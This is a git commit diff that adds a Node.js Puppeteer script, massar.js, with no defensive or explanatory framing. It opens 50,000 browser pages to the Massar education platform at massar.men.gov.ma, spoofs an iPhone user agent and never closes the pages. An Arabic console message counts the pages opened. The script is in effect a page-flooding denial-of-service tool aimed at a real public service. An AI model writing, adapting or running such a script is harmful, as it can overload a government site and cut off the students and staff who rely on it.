8200a19a7c515c073c9d41d8e87256be5f91734d
karimAlyamani <105087359+Kbot19@users.noreply.github.com>
2024-04-05 21:07:58 +0000

    Update and rename yt.py to massar.js

---
+++ massar.js
@@ -0,0 +1,19 @@
+const puppeteer = require('puppeteer');
+
+(async () => {
+  const browser = await puppeteer.launch({ headless: false });
+  const userAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1';
+  let pageCount = 0;
+
+  for (let i = 0; i < 50000; i++) {
+    const page = await browser.newPage();
+    await page.setUserAgent(userAgent);
+    await page.setViewport({ width: 414, height: 896 }); // Viewport for iPhone 12 Pro Max
+    await page.goto('https://massar.men.gov.ma');
+    pageCount++;
+  }
+
+  setInterval(() => {
+    console.log(`عدد الصفحات المفتوحة: ${pageCount}`);
+  }, 1000);
+})();
